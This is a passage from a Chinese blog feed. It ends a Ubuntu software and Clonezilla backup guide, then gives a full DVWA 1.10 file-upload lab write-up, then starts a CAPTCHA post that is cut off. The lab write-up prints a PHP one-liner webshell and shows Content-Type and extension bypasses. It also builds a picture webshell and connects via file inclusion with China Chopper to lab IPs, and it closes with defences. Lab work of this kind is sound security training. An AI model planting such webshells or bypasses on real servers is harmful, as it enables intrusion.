title="Chrome"></a>Chrome</h3><p>以<code>deb</code>格式安装</p><h3 id="Golddict"><a href="#Golddict" class="headerlink" title="Golddict"></a>Golddict</h3><ol><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install goldendict</span><br></pre></td></tr></table></figure></li><li><p>添加有道在线词典</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</span><br></pre></td></tr></table></figure></li></ol><h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><ol><li><p><code>mailspring</code>：界面更好看</p></li><li><p><code>thunderbird</code>：性能更优</p></li><li><p><code>Protonmail Desktop</code>：匿名邮件，实现端到端的加密</p></li></ol><h3 id="office"><a href="#office" class="headerlink" title="office"></a>office</h3><ol><li><p><code>WPS for Linux</code></p></li><li><p><code>onlyoffice</code></p></li></ol><h3 id="to-do-list-计划列表"><a href="#to-do-list-计划列表" class="headerlink" title="to-do-list(计划列表)"></a>to-do-list(计划列表)</h3><ol><li><p><code>zenkit</code></p><p> 通过<code>Ubuntu</code>官方软件安装器安装</p></li></ol><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ol><li><p>印象笔记<code>tusk</code></p><p> 通过<code>Ubuntu</code>官方软件安装器安装</p></li></ol><h3 id="书籍管理"><a href="#书籍管理" class="headerlink" title="书籍管理"></a>书籍管理</h3><ol><li><code>calibre</code></li></ol><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol><li><p><code>virtualbox</code></p></li><li><p><code>VMWare Workstation</code></p></li></ol><h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><ol><li><p><code>uGet</code></p><p> 支持断点续传</p><ol><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:plushuang-tw/uget-stable</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install uget aria2</span><br></pre></td></tr></table></figure></li><li><p>配置</p><p><img src="/images/Linuxmeihua/46.png" alt="46.png"></p></li></ol></li></ol><h3 id="图形图像视频编辑"><a href="#图形图像视频编辑" class="headerlink" title="图形图像视频编辑"></a>图形图像视频编辑</h3><ol><li><p><code>GIMP</code>：<code>Linux</code>下的<code>PS</code></p></li><li><p><code>VLC</code>：视频播放软件</p></li><li><p><code>kdenlive</code>：视频编辑</p></li><li><p><code>pitivi</code>：视频编辑</p></li></ol><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><ol><li><code>MindMaster</code></li></ol><h3 id="开发工具、编辑器"><a href="#开发工具、编辑器" class="headerlink" title="开发工具、编辑器"></a>开发工具、编辑器</h3><ol><li><p><code>sublime text</code></p></li><li><p><code>visual studio code</code></p></li><li><p><code>Atom</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/atom</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install atom</span><br></pre></td></tr></table></figure></li></ol><h3 id="appimage程序下载"><a href="#appimage程序下载" class="headerlink" title="appimage程序下载"></a>appimage程序下载</h3><p><a href="https://appimage.github.io/" target="_blank" rel="noopener">https://appimage.github.io/</a></p><hr><h1 id="系统快捷键"><a href="#系统快捷键" class="headerlink" title="系统快捷键"></a>系统快捷键</h1><ol><li><p><code>ctrl+alt+向上/向下</code>：快速切换<code>Linux</code>虚拟桌面</p></li><li><p><code>win+a</code>：显示系统所有安装的软件的界面</p></li><li><p><code>shift/alt+printscreen</code>：自定义截图/当前窗口截图，保存到图片目录</p></li><li><p><code>win+向上/向下/向左/向右</code>：将当前窗口最大化/返回初始大小及位置/屏幕一半靠左/屏幕一半靠右</p></li><li><p><code>ctrl+alt+t</code>：打开终端窗口</p></li><li><p><code>ctrl+shift+n</code>：在原有终端窗口基础上新建终端窗口或在桌面新建文件夹</p></li><li><p><code>ctrl+d</code>：关闭终端窗口</p></li><li><p><code>ctrl+shift+t</code>：在终端窗口中新建标签页</p></li><li><p><code>ctrl+shift+c/v</code>：在终端窗口中复制/粘贴</p></li><li><p><code>win+d</code>：显示桌面</p></li><li><p><code>ctrl+w/q</code>：关闭一个/关闭所有标签页(适用于部分应用程序)</p></li><li><p><code>win+l</code>：锁定当前登陆会话(锁屏)</p></li><li><p><code>win+m</code>：打开或关闭日历</p></li><li><p><code>win+h</code>：将当前窗口最小化</p></li><li><p><code>alt+win+8</code>：放大/恢复桌面</p></li><li><p><code>win+shift+pageup/pagedown</code>：将当前应用程序窗口上移/下移至其他虚拟桌面</p></li></ol><hr><h1 id="Ubuntu安装微信、QQ等"><a href="#Ubuntu安装微信、QQ等" class="headerlink" title="Ubuntu安装微信、QQ等"></a>Ubuntu安装微信、QQ等</h1><p>依靠<code>Deepin</code>开发移植，使得<code>Linux</code>操作系统可以安装<code>Windows</code>软件</p><h2 id="安装微信"><a href="#安装微信" class="headerlink" title="安装微信"></a>安装微信</h2><ol><li><p>安装<code>deepin-wine</code>环境</p><p> 访问<a href="https://github.com/wszqkzqk/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/wszqkzqk/deepin-wine-ubuntu</a> 下载<code>zip</code>包</p><p> 建议<code>git</code>下载</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu.git</span><br></pre></td></tr></table></figure><p> 解压到本地文件夹，在文件夹中打开终端，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./install.sh</span><br></pre></td></tr></table></figure></li><li><p>安装相关容器</p><p> 访问<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/</a>  下载想要的容器，以<code>deb</code>安装即可</p><p> 推荐容器</p><p> TIM：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.office/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.office/</a></p><p> QQ：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im/</a></p><p> QQ轻聊版：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im.light/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im.light/</a></p><p> 微信：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.wechat/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.wechat/</a></p></li><li><p>相关问题</p><ol><li><p><code>Ubuntu</code>桌面无法显示托盘图标</p><p>安装<code>TopIconPlus</code>的<code>gnome-shell</code>扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-shell-extension-top-icons-plus</span><br></pre></td></tr></table></figure><p>用<code>Alt+F2</code>–&gt;<code>r</code>命令重启<code>gnome-shell</code></p><p>最后用<code>gnome-tweaks</code>开启这个扩展</p></li><li><p>微信无法发送图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libjpeg62:i386</span><br></pre></td></tr></table></figure></li><li><p><code>Ubuntu</code>系发行版不卸载包</p><p><code>deepin-wine</code>环境使用<code>zip</code>包中的<code>uninstall.sh</code>脚本卸载</p><p><code>deepin-wine</code>的应用容器，用<code>sudo apt remove 软件包主名</code>命令来卸载</p></li></ol></li></ol><hr><h1 id="配置Shadowsocks"><a href="#配置Shadowsocks" class="headerlink" title="配置Shadowsocks"></a>配置Shadowsocks</h1><p>采用<code>shadowsocks-qt5(GUI)</code>+<code>Chrome/Firefox</code>+<code>SwitchOmega</code>的方式配置<code>shadowsocks</code>的科学上网模式</p><ol><li><p>添加<code>shadowsocks-qt5(GUI)</code>仓库</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:hzwhuang/ss-qt5</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仓库 “http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic Release” 没有Release 文件</span><br></pre></td></tr></table></figure><p> 解决方案</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/apt/sources.list.d/hzwhuang-ubuntu-ss-qt5-bionic.list文件，将bionic（18.04版本代号）改为xenial（16.04版本代号）</span><br></pre></td></tr></table></figure></li><li><p>安装<code>shadowsocks-qt5(GUI)</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install shadowsocks-qt5</span><br></pre></td></tr></table></figure></li><li><p>开启<code>shadowsocks-qt5(GUI)</code>，配置代理，后设置浏览器代理即可</p></li></ol><hr><h1 id="使用Clonezilla进行系统备份"><a href="#使用Clonezilla进行系统备份" class="headerlink" title="使用Clonezilla进行系统备份"></a>使用Clonezilla进行系统备份</h1><p><code>Ubuntu</code>自带<code>Disks</code>工具可以对系统分区或硬盘进行备份，但不支持备份压缩</p><p><code>Clonezilla</code>:</p><ol><li><p>源自台湾政府安全部门的开源项目</p></li><li><p>备份中可实现镜像压缩</p></li><li><p>支持网络及外置存储设备</p></li><li><p>支持服务器/客户端部署，支持<code>PXE</code>，即网路同传方式</p></li><li><p>以<code>ISO</code>引导的方式进行系统备份</p></li></ol><p>官方地址：<a href="https://clonezilla.org/" target="_blank" rel="noopener">https://clonezilla.org/</a></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>登录官方网站，选择最新稳定版<code>Clonezilla</code></p><p><img src="/images/Linuxmeihua/47.png" alt="47.png"></p><p>根据要备份的系统版本选择<code>Clonezilla</code>版本，下载<code>iso</code>版</p><p><img src="/images/Linuxmeihua/48.png" alt="48.png"></p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>当计算机只有一个硬盘时，可以对硬盘进行分区，将系统分区进行备份，将备份文件存储到其他分区中</p><p>当计算机使用多块硬盘时，建议将操作系统所在的硬盘进行整体备份，将备份文件存储到其他硬盘中，更加有利于系统的恢复</p><p><strong>以下操作在虚拟机环境下进行，对系统所在硬盘进行整体备份，存储到虚拟机的另一块硬盘中</strong></p><p><img src="/images/Linuxmeihua/49.png" alt="49.png"></p><ol><li><p>对新分配的硬盘进行分区等操作，使其能够进行存储</p></li><li><p>挂载<code>Clonezilla</code>的引导盘</p><p> <img src="/images/Linuxmeihua/50.png" alt="50.png"></p></li><li><p>设置虚拟机“启动时连接”，设置<code>BIOS</code>以光盘启动，启动虚拟机则会进入<code>Clonezilla</code>启动界面</p><p> <img src="/images/Linuxmeihua/51.png" alt="51.png"></p></li><li><p>选择第一项<code>Clonezilla live</code>，以光盘方式引导<code>Clonezilla</code>，或者选择第四项<code>Other modes of Clonezilla live</code>，以其他分辨率来启动<code>Clonezilla</code>，最高支持1024*768</p><p> <img src="/images/Linuxmeihua/52.png" alt="52.png"></p></li><li><p>选择操作的语言环境</p><p> <img src="/images/Linuxmeihua/53.png" alt="53.png"></p></li><li><p>选择键盘类型，默认美式键盘即可</p><p> <img src="/images/Linuxmeihua/54.png" alt="54.png"></p></li><li><p>选择启动<code>Clonezilla</code>或者进入<code>shell</code>命令行，选择第一项启动<code>Clonezilla</code></p><p> <img src="/images/Linuxmeihua/55.png" alt="55.png"></p></li><li><p>选择需要进行的操作，选择第一项<code>device-image</code></p><p> 第一项<code>device-image</code>：将硬盘或者分区备份为镜像文件</p><p>第二项<code>device-device</code>：将一个硬盘的所有内容复制到另一个硬盘中，包括引导、分区等</p><p>第三项至第六项为通过网络进行操作的选项</p><p><img src="/images/Linuxmeihua/56.png" alt="56.png"></p></li><li><p>选择备份完成的镜像文件的存储方式，因现在为将第一块硬盘备份为镜像文件存储到第二块硬盘上，则选择第一项<code>local_dev</code></p><p> <code>Clonezilla</code>支持通过各种方式将备份完成的镜像文件传输到其他位置，利于存储</p><p> <img src="/images/Linuxmeihua/57.png" alt="57.png"></p></li><li><p><code>Clonezilla</code>会提示插入存储设备，按回车，<code>Clonezilla</code>会自动检测存储设备</p><p><img src="/images/Linuxmeihua/58.png" alt="58.png"></p></li><li><p>此时，<code>Clonezilla</code>检测到计算机上的存储设备并列出，可以查看<code>Clonezilla</code>是否将存储设备全部列出</p><p><img src="/images/Linuxmeihua/59.png" alt="59.png"></p></li><li><p>确定<code>Clonezilla</code>将全部存储设备列出后，按<code>Ctrl+c</code>,选择存放备份完成的镜像文件的存储设备，现在即名称为<code>sdb1</code>的第二块硬盘</p><p><img src="/images/Linuxmeihua/60.png" alt="60.png"></p></li><li><p><code>Clonezilla</code>会列出所选择的存储设备上的文件目录，可以选择某个目录来存储备份完成的镜像文件，默认选择的为存储设备的根目录<code>\</code>，使用<code>Tab</code>选择<code>Done</code>，确定选择</p><p><img src="/images/Linuxmeihua/61.png" alt="61.png"></p></li><li><p><code>Clonezilla</code>会列出存储设备的挂载状态，按回车即可</p><p><img src="/images/Linuxmeihua/62.png" alt="62.png"></p></li><li><p>选择高级参数设置向导方式，建议选择第一项<code>Beginner</code>初学模式</p><p><img src="/images/Linuxmeihua/63.png" alt="63.png"></p></li><li><p>选择备份、还原方式，备份硬盘或者备份分区，还原硬盘或者还原分区，现在选择第一项<code>savedisk</code>备份硬盘</p><p><img src="/images/Linuxmeihua/64.png" alt="64.png"></p></li><li><p>设置备份完成的镜像文件的名称，默认以系统的日期进行命名，根据需要进行修改</p><p><img src="/images/Linuxmeihua/65.png" alt="65.png"></p></li><li><p>选择要备份的硬盘，即第一块硬盘，即操作系统所在的硬盘</p><p><img src="/images/Linuxmeihua/66.png" alt="66.png"></p></li><li><p>在系统备份之前，<code>Clonezilla</code>提示是否要对文件系统进行检查，可以根据实际情况进行选择</p><p><code>-sfsck</code>：跳过检查</p><p><code>-fsck</code>：进行检查</p><p><code>-fsck -y</code>：进行检查，并在检查过程中进行自动修复</p><p><img src="/images/Linuxmeihua/67.png" alt="67.png"></p></li><li><p><code>Clonezilla</code>提示在备份完成之后，是否要对备份完成的镜像文件进行检查，以保证镜像文件可以用于后续的恢复工作，可以根据实际情况进行选择</p><p><img src="/images/Linuxmeihua/68.png" alt="68.png"></p></li><li><p>设置是否对备份完成的镜像文件进行密码设置，设置后在使用镜像文件恢复时需要输入密码，可以根据实际情况进行选择</p><p><img src="/images/Linuxmeihua/69.png" alt="69.png"></p></li><li><p>设置当备份完成后，需要对计算机进行什么操作：选择、重启、关机</p><p><img src="/images/Linuxmeihua/70.png" alt="70.png"></p></li><li><p><code>Clonezilla</code>会将前面所有操作生成一条命令可供后续再次使用，按回车继续</p><p><img src="/images/Linuxmeihua/71.png" alt="71.png"></p></li><li><p><code>Clonezilla</code>会再次提示是否确认将第一块硬盘<code>sda</code>备份为镜像文件，此时<code>sda</code>中只有<code>sda1</code>一个分区，输入<code>y</code>确定</p><p><img src="/images/Linuxmeihua/72.png" alt="72.png"></p></li><li><p>备份开始</p><p><img src="/images/Linuxmeihua/73.png" alt="73.png"></p><p>备份完成后，按回车键即可执行前面第22步选择的操作：选择、重启、关机</p><p><img src="/images/Linuxmeihua/74.png" alt="74.png"></p></li><li><p>即可以看到生成的镜像文件</p><p><img src="/images/Linuxmeihua/75.png" alt="75.png"></p></li></ol><h2 id="还原恢复"><a href="#还原恢复" class="headerlink" title="还原恢复"></a>还原恢复</h2><ol><li><p>同样，使用<code>Clonezilla</code>光盘进行引导启动</p><p> <img src="/images/Linuxmeihua/76.png" alt="76.png"></p></li><li><p>重复备份时第4至12步的操作过程后，进入到<code>Clonezilla</code>列出镜像文件的存储设备上的文件目录界面，选择备份完成的<code>img</code>镜像文件，使用<code>Tab</code>键选择<code>Done</code></p><p> <img src="/images/Linuxmeihua/77.png" alt="77.png"></p></li><li><p>之后同样使用初学模式，进入选择备份硬盘或分区以及还原硬盘或分区界面，选择第三项<code>restoredisk</code>还原镜像文件到本机硬盘</p><p> <img src="/images/Linuxmeihua/78.png" alt="78.png"></p></li><li><p>确认用于恢复的镜像文件的名称</p><p> <img src="/images/Linuxmeihua/79.png" alt="79.png"></p></li><li><p>选择需要使用镜像文件恢复的硬盘</p><p> <img src="/images/Linuxmeihua/80.png" alt="80.png"></p></li><li><p><code>Clonezilla</code>提示是否在恢复前对镜像文件进行完整性检查，可以根据需要进行选择</p><p> <img src="/images/Linuxmeihua/81.png" alt="81.png"></p></li><li><p>选择在恢复完成后，计算机进行的操作：选择、重启、关机</p><p> <img src="/images/Linuxmeihua/82.png" alt="82.png"></p></li><li><p>同样，<code>Clonezilla</code>将所有操作生成一条命令用于后续再次使用，按回车键继续。之后，<code>Clonezilla</code>两次提示是否确认将进行镜像文件还原到<code>sda</code>硬盘的操作，输入<code>y</code>确认</p><p> <img src="/images/Linuxmeihua/83.png" alt="83.png"></p></li><li><p>还原恢复开始</p><p> <img src="/images/Linuxmeihua/84.png" alt="84.png"></p><p> 等待完成即可，同样，恢复完成后，按回车键即可执行前面第7步选择的操作：选择、重启、关机</p></li></ol><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.lulinux.com/archives/1319" target="_blank" rel="noopener">https://www.lulinux.com/archives/1319</a></p><p><a href="https://github.com/wszqkzqk/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/wszqkzqk/deepin-wine-ubuntu</a></p><p><a href="https://www.imzzj.com/post-549.html" target="_blank" rel="noopener">https://www.imzzj.com/post-549.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux桌面优化与美化" scheme="http://yoursite.com/categories/Linux%E6%A1%8C%E9%9D%A2%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BE%8E%E5%8C%96/"/>
    
    
      <category term="Linux桌面" scheme="http://yoursite.com/tags/Linux%E6%A1%8C%E9%9D%A2/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之文件上传</title>
    <link href="http://yoursite.com/2019/05/27/DVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2019/05/27/DVWA1-10之文件上传/</id>
    <published>2019-05-27T15:01:00.000Z</published>
    <updated>2020-02-24T04:17:16.572Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的<code>webshell</code>权限，因此文件上传漏洞带来的危害常常是毁灭性的，<code>Apache</code>、<code>Tomcat</code>、<code>Nginx</code>等都曝出过文件上传漏洞</p><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知</p><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><ol><li><p>编辑一句话木马<code>1.php</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> @eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>上传</p><p> <img src="/images/baji/dvwa/file upload/1.png" alt="1.png"></p></li><li><p>中国菜刀链接<code>webshell</code></p><p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/1.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p><p> <img src="/images/baji/dvwa/file upload/2.png" alt="2.png"></p></li><li><p>双击新添加的条目</p><p> <img src="/images/baji/dvwa/file upload/3.png" alt="3.png"></p></li><li><p>获取目标站点目录访问权限</p><p> <img src="/images/baji/dvwa/file upload/4.png" alt="4.png"></p></li><li><p>模拟终端</p><p> <img src="/images/baji/dvwa/file upload/5.png" alt="5.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码对上传文件的类型、大小做了限制，要求文件类型(<code>Content-Type</code>)必须是<code>jpeg</code>或者<code>png</code>，大小不能超过<code>100000B</code>（约为<code>97.6KB</code>）</p><!--## 组合攻击(文件包含+文件上传)1. 上传一句话木马`a.png`    一句话木马不受大小限制影响    ![6.png](/images/baji/dvwa/file upload/6.png)2. 使用中国菜刀连接`webshell`    ![7.png](/images/baji/dvwa/file upload/7.png)    无法成功获取`webshell`权限    中国菜刀的原理是向上传文件发送包含`cmd`参数的post请求，通过控制`cmd`参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送`post`请求时，服务器只会返回这个“图片”文件，并不会执行相应命令3. 利用`Medium`级别文件包含漏洞获取`webshell`权限    服务器包含文件时，不管文件后缀是否是`php`，都会尝试当做`php`文件执行，如果文件内容确为`php`，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容    中国菜刀连接`http://172.16.12.89/vulnerabilities/fi/?page=hthttp://tp://172.16.12.89/hackable/uploads/a.png`    参数名为`cmd`，脚本语言选择`php(eval)`--><h2 id="抓包修改文件类型"><a href="#抓包修改文件类型" class="headerlink" title="抓包修改文件类型"></a>抓包修改文件类型</h2><p>一句话木马不受大小限制影响</p><ol><li><p>将<code>1.php</code>更名为<code>a.png</code></p></li><li><p>上传<code>a.png</code>，抓包</p><p> <img src="/images/baji/dvwa/file upload/8.png" alt="8.png"></p></li><li><p>修改上传文件后缀名</p><p> <img src="/images/baji/dvwa/file upload/9.png" alt="9.png"></p></li><li><p>上传成功</p><p> <img src="/images/baji/dvwa/file upload/10.png" alt="10.png"></p></li><li><p>中国菜刀连接</p><p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/a.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p><p> <img src="/images/baji/dvwa/file upload/11.png" alt="11.png"></p></li></ol><!--## 截断绕过规则在`php`版本小于5.3.4的服务器中，当`Magic_quote_gpc`选项为`off`时，可以在文件名中使用`%00`截断，所以可以把上传文件命名为`a.php%00.png`可以通过文件类型检查1. 上传`a.php`    修改`Content-Type`为`image/png`    修改`a.php`为`a.php%00.png`2. 上传成功    ![16.png](/images/baji/dvwa/file upload/16.png)3. 中国菜刀连接--><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码读取文件名中最后一个<code>.</code>后的字符串(文件后缀名)，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是<code>*.jpg</code>、<code>*.jpeg</code> 、<code>*.png</code>之一。同时，<code>getimagesize</code>函数更是限制了上传文件的文件头必须为图像类型</p><h2 id="什么是文件头"><a href="#什么是文件头" class="headerlink" title="什么是文件头"></a>什么是文件头</h2><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分</p><p>文件头就是为了描述一个文件的一些重要的属性,文件头告诉了打开并处理该文件的程序这些属性</p><p>常见文件的文件头(16进制)：</p><ol><li><p><code>JPEG (jpg)</code>，文件头：<code>FFD8FF</code></p></li><li><p><code>PNG (png)</code>，文件头：<code>89504E47</code></p></li><li><p><code>GIF (gif)</code>，文件头：<code>47494638</code></p></li><li><p><code>HTML (html)</code>，文件头：<code>68746D6C3E</code></p></li><li><p><code>MS Word/Excel (xls.or.doc)</code>，文件头：<code>D0CF11E0</code></p></li><li><p><code>Quicken (qdf)</code>，文件头：<code>AC9EBD8F</code></p></li><li><p><code>ZIP Archive (zip)</code>，文件头：<code>504B0304</code></p></li><li><p><code>RAR Archive (rar)</code>，文件头：<code>52617221</code></p></li><li><p>可执行文件（<code>EXE</code>），文件头：<code>MZ</code></p></li></ol><!--## 截断绕过规则采用`%00`截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片--><h2 id="将木马隐藏在图片中绕过-文件上传-文件包含"><a href="#将木马隐藏在图片中绕过-文件上传-文件包含" class="headerlink" title="将木马隐藏在图片中绕过(文件上传+文件包含)"></a>将木马隐藏在图片中绕过(文件上传+文件包含)</h2><ol><li><p>使用<code>copy</code>将木马文件<code>a.php</code>与图片文件<code>1.jpg</code>合并</p><p> <img src="/images/baji/dvwa/file upload/12.png" alt="12.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+a.php/a a.jpg</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file upload/13.png" alt="13.png"></p><p>可以看到，一句话木马被添加到图片的尾部</p><p><img src="/images/baji/dvwa/file upload/14.png" alt="14.png"></p></li><li><p>上传成功</p><p> <img src="/images/baji/dvwa/file upload/15.png" alt="15.png"></p></li><li><p>利用<code>high</code>级别文件包含漏洞读取图片马</p><p> <img src="/images/baji/dvwa/file upload/17.png" alt="17.png"></p></li><li><p>中国菜刀连接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.83/vulnerabilities/fi/?page=file:///opt/lampp/htdocs/DVWA-master/hackable/uploads/a.jpg</span><br></pre></td></tr></table></figure><p>注意，应设置请求头中包含<code>cookie</code>值</p><p><img src="/images/baji/dvwa/file upload/18.png" alt="18.png"></p></li><li><p>连接成功</p><p> <img src="/images/baji/dvwa/file upload/19.png" alt="19.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码对上传文件进行了重命名（改为<code>md5</code>值），加入<code>Anti-CSRF token</code>防护<code>CSRF</code>攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件</p><hr><h1 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h1><ol><li><p>文件扩展名在服务器端使用白名单进行校验</p></li><li><p>文件内容在服务器端进行校验</p></li><li><p>对文件进行上传重命名</p></li><li><p>隐藏文件上传路径</p></li><li><p>文件上传目录权限为任何人不可执行</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之不安全的验证码</title>
    <link href="http://yoursite.com/2019/05/23/DVWA1-10%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yoursite.com/2019/05/23/DVWA1-10之不安全的验证码/</id>
    <published>2019-05-23T14:11:00.000Z</published>
    <updated>2020-02-24T04:17:42.177Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Insecure CAPTCHA</code>，意思是不安全的验证码，<code>CAPTCHA</code>是“全自动区分计算机和人类的图灵测试”的简称</p><p><code>reCaptcha</code>是<code>Google</code>开发的验证码工具，是<code>Google</code>提供的使用最广泛的验证码服务，是一项免费服务，可以保护您的网站免受垃圾邮件和滥用。<code>reCAPTCHA</code>使用先进的风险分析引擎和自适应<code>CAPTCHA</code>来防止自动化软件在您的网站上进行滥用行为</p><h2 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a>reCAPTCHA验证流程</h2><p><img src="/images/baji/dvwa/insecure captcha/1.png" alt="1.png"></p><p>网站服务器调用<code>recaptcha_check_answer</code>函数检查用户输入验证码的正确性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recaptcha_check_answer($privkey,$response)</span><br></pre></td></tr></table></figure><ol><li><p><code>$privkey</code>是服务器申请的<code>private key</code>(私钥)</p></li><li><p><code>$response</code>：通过页面表单发送的<code>g-recaptcha-response</code>的值</p></li></ol><p><code>recaptcha_check_answer</code>函数返回<code>ReCaptchaResponse class</code>的实例，<code>ReCaptchaResponse</code>类有2个属性：</p><ol><li><p><code>$is_valid</code>是布尔型的，表示校验是否有效</p></li><li><p><code>$error</code>是返回的错误代码</p></li></ol><p><img src="/images/baji/dvwa/insecure captcha/2.png" alt="2.png"></p><p><strong>那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码</strong></p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" 